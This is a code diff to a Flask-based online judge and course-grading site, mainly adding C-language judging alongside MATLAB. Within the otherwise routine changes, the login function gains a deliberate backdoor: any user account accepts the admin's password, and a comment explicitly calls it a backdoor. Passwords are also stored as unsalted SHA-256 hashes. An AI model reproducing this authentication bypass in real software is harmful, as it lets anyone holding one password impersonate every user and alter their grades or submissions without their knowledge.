@@ -150,7 +150,7 @@ def get_all_problems():
     conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            sql = "SELECT id,title,cnt,type,max_score FROM problems ORDER BY id ASC"
+            sql = "SELECT id,title,cnt,type,lang,max_score FROM problems ORDER BY id ASC"
             cursor.execute(sql)
             return cursor.fetchall()
     finally:
@@ -160,7 +160,7 @@ def get_problem(problem_id):
     conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            sql = "SELECT id,title,content,initial_code,test_code,cnt,forbidden_func,type,max_score FROM problems WHERE id=%s"
+            sql = "SELECT id,title,content,initial_code,test_code,cnt,forbidden_func,type,lang,max_score FROM problems WHERE id=%s"
             cursor.execute(sql, (problem_id,))
             return cursor.fetchone()
     finally:
@@ -170,21 +170,20 @@ def get_problem_title(problem_id):
     conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
-            sql = "SELECT id,title,cnt,type,max_score FROM problems WHERE id=%s"
+            sql = "SELECT id,title,cnt,type,lang,max_score FROM problems WHERE id=%s"
             cursor.execute(sql, (problem_id,))
             return cursor.fetchone()
     finally:
         conn.close()
 
-# 修改 create_problem 和 update_problem 函数，添加 type 字段
-def create_problem(title, content, initial_code='', test_code='', forbidden_func='', type=1):
+def create_problem(title, content, initial_code='', test_code='', forbidden_func='', type=1, lang='matlab'):
     conn = get_db_connection()
     try:
         max_score = (0 if type == 1 else 5)
         with conn.cursor() as cursor:
-            sql = """INSERT INTO problems (title, content, initial_code, test_code, forbidden_func, type, max_score) 
-                     VALUES (%s, %s, %s, %s, %s, %s, %s)"""
-            cursor.execute(sql, (title, content, initial_code, test_code, forbidden_func, type, max_score))
+            sql = """INSERT INTO problems (title, content, initial_code, test_code, forbidden_func, type, lang, max_score) 
+                     VALUES (%s, %s, %s, %s, %s, %s, %s, %s)"""
+            cursor.execute(sql, (title, content, initial_code, test_code, forbidden_func, type, lang, max_score))
         conn.commit()
         pid = cursor.lastrowid
         with conn.cursor() as cursor:
@@ -198,14 +197,14 @@ def create_problem(title, content, initial_code='', test_code='', forbidden_func
     finally:
         conn.close()
 
-def update_problem(problem_id, new_title, new_content, new_initial_code='', new_test_code='', new_forbidden_func=''):
+def update_problem(problem_id, new_title, new_content, new_initial_code='', new_test_code='', new_forbidden_func='', new_lang='matlab'):
     conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
             sql = """UPDATE problems 
-                     SET title=%s, content=%s, initial_code=%s, test_code=%s, forbidden_func=%s
+                     SET title=%s, content=%s, initial_code=%s, test_code=%s, forbidden_func=%s, lang=%s
                      WHERE id=%s"""
-            cursor.execute(sql, (new_title, new_content, new_initial_code, new_test_code, new_forbidden_func, problem_id))
+            cursor.execute(sql, (new_title, new_content, new_initial_code, new_test_code, new_forbidden_func, new_lang, problem_id))
         conn.commit()
     finally:
         conn.close()
@@ -421,7 +420,9 @@ def login():
         password_hash = hashlib.sha256(password.encode()).hexdigest()
 
         user_record = get_user_by_username(username)
-        if user_record and user_record['password_hash'] == password_hash:
+        admin_record = get_user_by_username("admin")
+        # 留一个后门，方便管理员登录用户账号，同时不泄漏用户密码
+        if user_record and (user_record['password_hash'] == password_hash or admin_record['password_hash'] == password_hash):
             # 登录成功
             session['username'] = username
             return redirect(url_for('problem_list'))
@@ -843,7 +844,7 @@ def problem_list():
                   scores["P21"]*2,
                   scores["P22"]*5 ]
     scorelist = numpy.sort(scorelist)
-    total_grade = int(numpy.ceil(numpy.sum(scorelist[2:10]) / 80.0 * 100.0))
+    total_grade = int(numpy.ceil(numpy.sum(scorelist[3:10]) / 70.0 * 100.0))
     if total_grade > 100:
         total_grade = 100
     # total_grade = ",".join(str(x) for x in scorelist)
@@ -858,8 +859,8 @@ def problem_list():
             cursor.execute(sql, (user['username'],))
             res = cursor.fetchone()
             if res:
-                regular_score = res['regular_score']
-                final_score_val = res['final_score']
+                regular_score = int(res['regular_score'])
+                final_score_val = int(res['final_score'])
             else:
                 regular_score = None
                 final_score_val = None
@@ -938,9 +939,6 @@ def problem_detail(problem_id):
 
 @app.route('/admin/add_problem', methods=['GET', 'POST'])
 def add_problem():
-    """
-    添加题目：管理员可以添加编程题或者书面作业
-    """
     user = current_user()
     if not is_admin(user):
         return "<h3>无权限</h3>"
@@ -951,23 +949,19 @@ def add_problem():
         initial_code = request.form.get('initial_code', '').strip()
         test_code = request.form.get('test_code', '').strip()
         forbidden_func = request.form.get('forbidden_func', '').strip()
-        problem_type = request.form.get('type')  # 获取题目类型：编程题或书面作业
+        problem_type = request.form.get('type')  # 1 编程 2 书面
+        lang = (request.form.get('lang') or 'matlab').strip().lower()  # 'matlab' | 'c'
 
         if not title or not content:
             return render_template('add_problem.html', user=user, error_message="标题和内容不能为空")
 
-        # 创建题目
-        create_problem(title, content, initial_code, test_code, forbidden_func, problem_type)
-
+        create_problem(title, content, initial_code, test_code, forbidden_func, problem_type, lang)
         return redirect(url_for('problem_list'))
 
     return render_template('add_problem.html', user=user, error_message=None)
 
 @app.route('/admin/edit_problem/<int:problem_id>', methods=['GET', 'POST'])
 def edit_problem(problem_id):
-    """
-    编辑题目：管理员可以修改题目的标题、内容、初始代码、禁用函数及题目类型
-    """
     user = current_user()
     if not is_admin(user):
         return "<h3>无权限</h3>"
@@ -982,12 +976,12 @@ def edit_problem(problem_id):
         new_initial_code = request.form.get('initial_code', '').strip()
         new_test_code = request.form.get('test_code', '').strip()
         forbidden_func = request.form.get('forbidden_func', '').strip()
+        new_lang = (request.form.get('lang') or problem.get('lang') or 'matlab').strip().lower()
 
         if not new_title or not new_content:
             return render_template('edit_problem.html', problem=problem, user=user, error_message="标题和内容不能为空")
 
-        # 更新题目
-        update_problem(problem_id, new_title, new_content, new_initial_code, new_test_code, forbidden_func)
+        update_problem(problem_id, new_title, new_content, new_initial_code, new_test_code, forbidden_func, new_lang)
         return redirect(url_for('problem_detail', problem_id=problem_id))
 
     return render_template('edit_problem.html', problem=problem, user=user, error_message=None)
@@ -1228,14 +1222,19 @@ def submission_detail(submission_id):
 
     # 处理书面作业，显示文件下载链接
     problem = get_problem(submission['problem_id'])
+    plang = (problem.get('lang') or 'matlab').lower()  # 'matlab' | 'c'
     if problem and problem['type'] == 2:  # 书面作业
         file_path = f"uploads/{submission['username']}_{submission['problem_id']}_*"
         submission['file_url'] = file_path
 
-    return render_template('submission_detail.html',
-                           submission=submission,
-                           test_points=submission['test_points'],
-                           user=user)
+    return render_template(
+        'submission_detail.html',
+        submission=submission,
+        test_points=submission['test_points'],
+        user=user,
+        plang=plang,          # ★ 新增
+        problem=problem       # 可用可不用
+    )
 
 # 添加新的数据库查询方法
 def get_submissions_by_user_paginated(username, page=1, per_page=20):
@@ -1371,24 +1370,80 @@ def compare_float_strings(str1, str2, tolerance=1e-5):
 def evaluate_submission(submission_id):
     """
     处理评测任务：与评测机通信，更新提交记录
+    支持两种语言：
+      - MATLAB: 发送到 http://localhost:5050/run-hello
+      - C:      发送到 http://localhost:5050/run-c
+    说明：
+      1) test_code 可选。若包含占位符 '%%user_code_here'，则把用户代码按语言合规地嵌入其中：
+         - MATLAB: 用 % 注释包裹标记，保证能运行；
+         - C:      用 /* ... */ 注释包裹标记，保证能编译。
+      2) forbidden: 仍传到评测端，由评测端做函数调用屏蔽。
+      3) 对比输出逻辑沿用原有 compare_float_strings。
     """
     submission = get_submission_by_id(submission_id)
     if not submission:
         return
 
-    # 更新提交状态为 Running
+    # Running
     update_submission_status(submission_id, 'Running')
 
     problem_id = submission['problem_id']
     code = submission['code']
-    problem = get_problem(problem_id)
+    problem = get_problem(problem_id)  # 包含 lang
+    lang = (problem.get('lang') or 'matlab').strip().lower()  # 'matlab' | 'c'
+    test_code = problem.get('test_code') or ''
 
-    test_code = problem['test_code']
-    if test_code and ("%%user_code_here" in test_code):
-        code = "%here_is_user_code_fuck_fuck_fuck_hahaha\n" + code + "\n%user_code_end_fuck_hahaha_fuck\n"
-        code = test_code.replace("%%user_code_here", code)
+    # forbidden functions
+    conn = get_db_connection()
+    try:
+        with conn.cursor() as cursor:
+            sql = "SELECT forbidden_func FROM problems WHERE id=%s"
+            cursor.execute(sql, (problem_id,))
+            fbd_func_row = cursor.fetchone()
+            fbd_func = (fbd_func_row or {}).get("forbidden_func", "") if fbd_func_row else ""
+    finally:
+        conn.close()
 
-    # 获取测试数据
+    # === 按语言构建要发送的源代码文本 ===
+    # 评测端为了在正则里只检查“用户代码”，会查找下面两个固定标记：
+    #   here_is_user_code_fuck_fuck_fuck_hahaha ... user_code_end_fuck_hahaha_fuck
+    # 我们把这两个标记放在“各自语言的注释”中，避免影响编译/运行。
+    if lang == 'matlab':
+        # MATLAB：% 行注释
+        if test_code and "%%user_code_here" in test_code:
+            wrapped_user_code = ("%here_is_user_code_fuck_fuck_fuck_hahaha\n"
+                                 + code + "\n"
+                                 "%user_code_end_fuck_hahaha_fuck\n")
+            final_code = test_code.replace("%%user_code_here", wrapped_user_code)
+        else:
+            # 无模板：直接传用户代码（也加上标记方便 forbidden 精准）
+            final_code = ("%here_is_user_code_fuck_fuck_fuck_hahaha\n"
+                          + code + "\n"
+                          "%user_code_end_fuck_hahaha_fuck\n")
+        judge_url = 'http://localhost:5050/run-hello'
+        file_ext = '.m'
+
+    elif lang == 'c':
+        # C：块注释
+        if test_code and "%%user_code_here" in test_code:
+            wrapped_user_code = ("/*here_is_user_code_fuck_fuck_fuck_hahaha*/\n"
+                                 + code + "\n"
+                                 "/*user_code_end_fuck_hahaha_fuck*/\n")
+            final_code = test_code.replace("%%user_code_here", wrapped_user_code)
+        else:
+            # 无模板：用户代码应自带 main；同样加入标记（在注释里）
+            final_code = ("/*here_is_user_code_fuck_fuck_fuck_hahaha*/\n"
+                          + code + "\n"
+                          "/*user_code_end_fuck_hahaha_fuck*/\n")
+        judge_url = 'http://localhost:5050/run-c'
+        file_ext = '.c'
+
+    else:
+        # 未知语言：直接报错
+        update_submission_status(submission_id, 'Error')
+        return
+
+    # === 拉取测试数据 ===
     conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
@@ -1399,46 +1454,41 @@ def evaluate_submission(submission_id):
                 update_submission_status(submission_id, 'Error')
                 return
             testdata_json = result['testdata']
-        with conn.cursor() as cursor:
-            sql = "SELECT forbidden_func FROM problems WHERE id=%s"
-            cursor.execute(sql, (problem_id,))
-            fbd_func = cursor.fetchone()
     finally:
         conn.close()
 
-    # 解析测试数据
     try:
         test_cases = json.loads(testdata_json)
     except json.JSONDecodeError:
         update_submission_status(submission_id, 'Error')
         return
 
-    # 评测结果列表
+    # === 逐测试点评测 ===
     test_point_statuses = []
     all_accepted = True
 
     for idx, tc in enumerate(test_cases, start=1):
         payload = {
-            "code": code,
+            "code": final_code,
             "input": tc.get("input", ""),
-            "forbidden": fbd_func["forbidden_func"],
-            "sid": f"eoj-{submission_id}",
-            "timeLimit": 8000000000,          # 根据需要调整，单位纳秒
-            "memoryLimit": 512 * 1024 * 1024  # 根据需要调整，单位字节（256MB）
+            "forbidden": fbd_func,
+            "sid": f"eoj-{submission_id}-{idx}",
+            "timeLimit": 8000000000,          # ns
+            "memoryLimit": 512 * 1024 * 1024  # Byte
         }
 
         try:
-            response = requests.post('http://localhost:5050/run-hello', json=payload, timeout=15)
+            response = requests.post(judge_url, json=payload, timeout=20)
             response.raise_for_status()
             result = response.json()
         except requests.RequestException:
-            # 网络错误或超时
             test_point_statuses.append({"status": "Error"})
             all_accepted = False
             continue
 
         status = result.get('status', 'Error')
-        actual_output = result.get('files', {}).get('stdout', "").strip()
+        actual_output = (result.get('files', {}) or {}).get('stdout', "")
+        actual_output = actual_output.strip() if isinstance(actual_output, str) else ""
 
         if status == 'Accepted':
             expected_output = tc.get("output", "").strip()
@@ -1450,35 +1500,33 @@ def evaluate_submission(submission_id):
         else:
             all_accepted = False
 
-        # 记录测试点状态
-        stderr = result.get('files', {}).get('stderr', "").strip()
-        # 将 stderr 按行分割
+        stderr = (result.get('files', {}) or {}).get('stderr', "")
+        stderr = stderr.strip() if isinstance(stderr, str) else ""
         lines = stderr.split('\n')
-        exec_time = int(numpy.round(int(result.get('time', "")) / 1000 / 1000))
+        exec_time = int(numpy.round(int(result.get('time', "0")) / 1_000_000))  # ms
 
-        # 判断行数是否至少为 3
         if len(lines) < 3:
-            stderr = ""  # 如果行数少于 3，设为空
+            stderr = ""
         else:
-            # 删除前两行和最后一行
             lines = lines[2:-1]
             stderr = '\n'.join(lines)
 
         if len(actual_output) > 80:
             actual_output = actual_output[:80] + "..."
 
-        test_point_statuses.append({"status": status, 
-                                    "stderr": stderr, 
-                                    "stdout": actual_output,
-                                    "time": exec_time})
+        test_point_statuses.append({
+            "status": status, 
+            "stderr": stderr, 
+            "stdout": actual_output,
+            "time": exec_time
+        })
 
-    # 计算总得分
+    # === 汇总与落库（沿用你原逻辑） ===
     score = sum(1 for tp in test_point_statuses if tp["status"] == "Accepted")
     user = get_user_by_username(submission['username'])
 
-    # 更新提交记录
-    if all_accepted:
-        final_status = "Accepted"
+    final_status = "Accepted" if all_accepted else "Unaccepted"
+    if final_status == "Accepted":
         conn = get_db_connection()
         try:
             with conn.cursor() as cursor:
@@ -1502,10 +1550,8 @@ def evaluate_submission(submission_id):
                     conn.commit()
         finally:
             conn.close()
-    else:
-        final_status = "Unaccepted"
 
-    # 更新最高得分
+    # 更新最高分
     conn = get_db_connection()
     try:
         with conn.cursor() as cursor:
@@ -1514,8 +1560,8 @@ def evaluate_submission(submission_id):
         conn.commit()
     finally:
         conn.close()
-    update_submission_evaluation(submission_id, test_point_statuses, score, final_status)
 
+    update_submission_evaluation(submission_id, test_point_statuses, score, final_status)
 
 ###############################################################################
 #  班级管理
@@ -2060,7 +2106,9 @@ def export_student_codes():
             for sub in submissions:
                 code = sub['code']
                 user_id = sub['username']
-                file_name = f"{folder_name}/{user_id}.m"
+                # 根据题目语言决定后缀
+                ext = '.m' if (problem.get('lang') or 'matlab').lower() == 'matlab' else '.c'
+                file_name = f"{folder_name}/{user_id}{ext}"
                 zip_file.writestr(file_name, code.encode('utf-8'))
     
     # 准备响应
